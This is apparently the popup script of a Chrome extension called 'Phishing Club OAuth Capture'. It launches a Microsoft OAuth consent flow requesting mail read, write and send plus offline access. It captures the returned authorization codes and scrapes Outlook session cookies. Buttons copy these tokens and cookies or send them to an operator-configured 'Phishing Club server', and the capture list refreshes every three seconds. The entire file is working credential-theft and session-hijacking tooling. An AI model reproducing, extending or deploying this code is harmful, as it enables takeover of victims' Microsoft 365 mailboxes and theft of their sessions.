/**
 * Phishing Club OAuth Capture — Popup Script
 *
 * Flow:
 *   1. Enter Phishing Club server URL
 *   2. Click "Connect" → tests connection via /api/extension/ping
 *   3. Sign into Microsoft → extension auto-captures & sends the code
 */

let isConnected = false;
let currentServerUrl = '';
let capturedCookieData = null;

// Init
document.addEventListener('DOMContentLoaded', () => {
  loadSettings();
  loadTokens();
  loadCapturedCookies();
  setupListeners();

  chrome.storage.local.get(['clientId', 'tenantId'], (r) => {
    if (r.clientId) document.getElementById('clientId').value = r.clientId;
    if (r.tenantId) document.getElementById('tenantId').value = r.tenantId;
  });
});

// Safe message sender (suppresses port-closed errors)
function safeSendMessage(msg, callback) {
  try {
    chrome.runtime.sendMessage(msg, (resp) => {
      if (chrome.runtime.lastError) return;
      if (callback) callback(resp);
    });
  } catch (e) { /* Extension context invalidated */ }
}

// Load saved settings
function loadSettings() {
  safeSendMessage({ action: 'getSettings' }, (resp) => {
    if (!resp) return;
    document.getElementById('enabledToggle').checked = resp.enabled !== false;
    document.getElementById('autoCaptureToggle').checked = resp.autoCapture !== false;
    document.getElementById('notificationsToggle').checked = resp.notifications !== false;
    document.getElementById('serverUrl').value = resp.serverUrl || '';
    currentServerUrl = resp.serverUrl || '';
    isConnected = resp.connected || false;
    updateConnectButton();
  });
}

// Load captured tokens
function loadTokens() {
  safeSendMessage({ action: 'getTokens' }, (resp) => {
    if (!resp) return;
    renderTokens(resp.tokens || []);
  });
}

// Load captured cookies (for summary card)
function loadCapturedCookies() {
  safeSendMessage({ action: 'getCapturedCookies' }, (resp) => {
    if (!resp) return;
    const captures = resp.cookies || [];
    const summary = document.getElementById('cookieSummary');
    if (captures.length > 0) {
      const latest = captures[0];
      capturedCookieData = latest;
      summary.style.display = 'block';
      document.getElementById('cookieCount').textContent = latest.totalCount;
      document.getElementById('cookieDomainCount').textContent = Object.keys(latest.domainGroups || {}).length;

      const domainsEl = document.getElementById('cookieDomains');
      domainsEl.innerHTML = '';
      for (const domain of Object.keys(latest.domainGroups || {})) {
        const tag = document.createElement('span');
        tag.className = 'cookie-domain-tag';
        tag.textContent = domain;
        domainsEl.appendChild(tag);
      }

      const sendBtn = document.getElementById('sendCookiesBtn');
      if (latest.sent) {
        sendBtn.textContent = 'Sent';
        sendBtn.style.background = '#4CAF50';
      } else {
        sendBtn.textContent = 'Send';
        sendBtn.style.background = '#4CAF50';
      }
    } else {
      summary.style.display = 'none';
    }
  });
}

function renderTokens(tokens) {
  const list = document.getElementById('tokensList');
  const count = document.getElementById('tokenCount');
  count.textContent = tokens.length;

  if (tokens.length === 0) {
    list.innerHTML = '<div class="no-tokens">No tokens captured yet</div>';
    return;
  }

  list.innerHTML = '';
  tokens.forEach((token, i) => {
    const el = document.createElement('div');
    el.className = `token-item ${token.sent ? 'sent' : 'unsent'}`;

    const time = new Date(token.timestamp).toLocaleString();
    const codePreview = token.code.substring(0, 40) + '...';
    const statusText = token.sent
      ? '<span class="token-status ok">Sent to server</span>'
      : '<span class="token-status pending">Not sent</span>';

    el.innerHTML = `
      <div class="token-time">OAuth Token — ${time}</div>
      <div class="token-code">${codePreview}</div>
      ${statusText}
      <div style="display: flex; gap: 4px; margin-top: 4px;">
        <button class="btn btn-sm" data-copy="${i}">Copy</button>
        ${!token.sent ? `<button class="btn btn-sm" data-send="${i}" style="background:#4CAF50;">Send</button>` : ''}
      </div>
    `;
    list.appendChild(el);
  });

  // Also render cookie captures
  safeSendMessage({ action: 'getCapturedCookies' }, (resp) => {
    if (!resp) return;
    const cookieCaptures = resp.cookies || [];
    cookieCaptures.forEach((capture, i) => {
      const el = document.createElement('div');
      el.className = `cookie-item ${capture.sent ? 'sent' : ''}`;

      const time = new Date(capture.timestamp).toLocaleString();
      const domains = Object.keys(capture.domainGroups || {}).slice(0, 3).join(', ');

      el.innerHTML = `
        <div class="token-time">Cookie Capture — ${time}</div>
        <div class="token-code">${capture.totalCount} cookies — ${domains}${Object.keys(capture.domainGroups || {}).length > 3 ? '...' : ''}</div>
        <span class="token-status ${capture.sent ? 'ok' : 'pending'}">${capture.sent ? 'Sent to server' : 'Not sent'}</span>
        ${!capture.sent ? `<button class="btn btn-sm" data-send-cookie="${i}" style="background:#4CAF50; margin-top: 4px;">Send</button>` : ''}
      `;
      list.appendChild(el);
    });

    // Send cookie buttons
    list.querySelectorAll('[data-send-cookie]').forEach(btn => {
      btn.addEventListener('click', () => {
        const idx = parseInt(btn.dataset.sendCookie);
        btn.textContent = 'Sending...';
        btn.disabled = true;
        chrome.runtime.sendMessage({
          action: 'sendCookies',
          serverUrl: currentServerUrl,
          cookieData: cookieCaptures[idx]
        }, (resp) => {
          if (resp?.success) {
            btn.textContent = 'Sent!';
            loadTokens();
          } else {
            btn.textContent = 'Failed';
            btn.disabled = false;
          }
        });
      });
    });
  });

  // Copy buttons
  list.querySelectorAll('[data-copy]').forEach(btn => {
    btn.addEventListener('click', () => {
      const idx = parseInt(btn.dataset.copy);
      navigator.clipboard.writeText(tokens[idx].code);
      btn.textContent = 'Copied!';
      setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
    });
  });

  // Manual send buttons
  list.querySelectorAll('[data-send]').forEach(btn => {
    btn.addEventListener('click', () => {
      const idx = parseInt(btn.dataset.send);
      btn.textContent = 'Sending...';
      btn.disabled = true;
      chrome.runtime.sendMessage({
        action: 'sendToken',
        serverUrl: currentServerUrl,
        tokenData: tokens[idx]
      }, (resp) => {
        if (resp?.success) {
          btn.textContent = 'Sent!';
          loadTokens();
        } else {
          btn.textContent = 'Failed';
          btn.disabled = false;
        }
      });
    });
  });
}

// Update the Connect button state
function updateConnectButton() {
  const btn = document.getElementById('connectBtn');
  if (isConnected) {
    btn.textContent = 'Connected';
    btn.classList.add('connected');
  } else {
    btn.textContent = 'Connect';
    btn.classList.remove('connected');
  }
}

function setStatus(msg, type) {
  const el = document.getElementById('statusMsg');
  el.textContent = msg;
  el.className = `status-msg ${type}`;
}

// Event listeners
function setupListeners() {
  // Connect button
  document.getElementById('connectBtn').addEventListener('click', () => {
    const url = document.getElementById('serverUrl').value.trim();

    if (!url) {
      setStatus('Enter your Phishing Club server URL first', 'err');
      return;
    }

    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      setStatus('URL must start with http:// or https://', 'err');
      return;
    }

    const btn = document.getElementById('connectBtn');
    btn.textContent = 'Connecting...';
    btn.disabled = true;
    setStatus('Testing connection...', 'info');

    chrome.runtime.sendMessage({
      action: 'updateSettings',
      settings: { serverUrl: url }
    });
    currentServerUrl = url;

    chrome.runtime.sendMessage({
      action: 'testConnection',
      serverUrl: url
    }, (resp) => {
      btn.disabled = false;
      if (resp?.success) {
        isConnected = true;
        setStatus('Connected to Phishing Club server!', 'ok');
      } else {
        isConnected = false;
        setStatus(resp?.error || 'Could not reach server', 'err');
      }
      updateConnectButton();
    });
  });

  // Toggle handlers
  document.getElementById('enabledToggle').addEventListener('change', (e) => {
    chrome.runtime.sendMessage({ action: 'updateSettings', settings: { enabled: e.target.checked } });
  });
  document.getElementById('autoCaptureToggle').addEventListener('change', (e) => {
    chrome.runtime.sendMessage({ action: 'updateSettings', settings: { autoCapture: e.target.checked } });
  });
  document.getElementById('notificationsToggle').addEventListener('change', (e) => {
    chrome.runtime.sendMessage({ action: 'updateSettings', settings: { notifications: e.target.checked } });
  });

  // Clear all captures
  document.getElementById('clearBtn').addEventListener('click', () => {
    if (confirm('Clear all captured tokens and cookies?')) {
      chrome.runtime.sendMessage({ action: 'clearTokens' }, () => {
        chrome.runtime.sendMessage({ action: 'clearCookies' }, () => {
          loadTokens();
          loadCapturedCookies();
        });
      });
    }
  });

  // Start OAuth Flow
  document.getElementById('startOAuthBtn').addEventListener('click', () => {
    const clientId = document.getElementById('clientId').value.trim();
    const tenantId = document.getElementById('tenantId').value.trim() || 'common';
    const statusEl = document.getElementById('oauthStatus');

    if (!clientId) {
      statusEl.textContent = 'Enter your Azure App Client ID';
      statusEl.className = 'status-msg err';
      return;
    }

    // Save credentials
    chrome.storage.local.set({ clientId, tenantId });

    const redirectUri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
    const scopes = [
      'offline_access',
      'Mail.Read',
      'Mail.ReadWrite',
      'Mail.Send',
      'User.Read'
    ].join(' ');

    const oauthUrl = `https://login.microsoftonline.com/${tenantId}/oauth2/v2.0/authorize?` +
      `client_id=${encodeURIComponent(clientId)}` +
      `&response_type=code` +
      `&redirect_uri=${encodeURIComponent(redirectUri)}` +
      `&scope=${encodeURIComponent(scopes)}` +
      `&prompt=consent`;

    statusEl.textContent = 'Opening Microsoft sign-in... Sign in and the extension will capture the code.';
    statusEl.className = 'status-msg info';

    chrome.tabs.create({ url: oauthUrl });
  });

  // Capture Cookies
  document.getElementById('captureCookiesBtn').addEventListener('click', () => {
    const btn = document.getElementById('captureCookiesBtn');
    const statusEl = document.getElementById('cookieStatus');

    btn.textContent = 'Capturing...';
    btn.disabled = true;
    statusEl.textContent = 'Scanning Outlook domains for cookies...';
    statusEl.className = 'status-msg info';

    chrome.runtime.sendMessage({ action: 'captureCookies' }, (resp) => {
      btn.disabled = false;
      btn.textContent = 'Capture Outlook Cookies';

      if (resp?.success) {
        statusEl.textContent = `Captured ${resp.count} cookies from ${resp.domains?.length || 0} domains!` +
          (resp.sent ? ' Sent to server.' : '');
        statusEl.className = 'status-msg ok';
        loadCapturedCookies();
        loadTokens();
      } else {
        statusEl.textContent = resp?.error || 'No cookies found. Are you signed into Outlook?';
        statusEl.className = 'status-msg err';
      }
    });
  });

  // Send Cookies to Server
  document.getElementById('sendCookiesBtn').addEventListener('click', () => {
    if (!capturedCookieData) return;
    if (!currentServerUrl) {
      document.getElementById('cookieStatus').textContent = 'Connect to your server first';
      document.getElementById('cookieStatus').className = 'status-msg err';
      return;
    }

    const btn = document.getElementById('sendCookiesBtn');
    btn.textContent = 'Sending...';
    btn.disabled = true;

    chrome.runtime.sendMessage({
      action: 'sendCookies',
      serverUrl: currentServerUrl,
      cookieData: capturedCookieData
    }, (resp) => {
      btn.disabled = false;
      if (resp?.success) {
        btn.textContent = 'Sent!';
        document.getElementById('cookieStatus').textContent = 'Cookies sent to server successfully!';
        document.getElementById('cookieStatus').className = 'status-msg ok';
        loadCapturedCookies();
        loadTokens();
      } else {
        btn.textContent = 'Send';
        document.getElementById('cookieStatus').textContent = resp?.error || 'Failed to send cookies';
        document.getElementById('cookieStatus').className = 'status-msg err';
      }
    });
  });
}

// Refresh every 3 seconds
setInterval(() => {
  try {
    if (chrome.runtime?.id) {
      loadTokens();
      loadCapturedCookies();
    }
  } catch (e) { /* Extension context invalidated */ }
}, 3000);
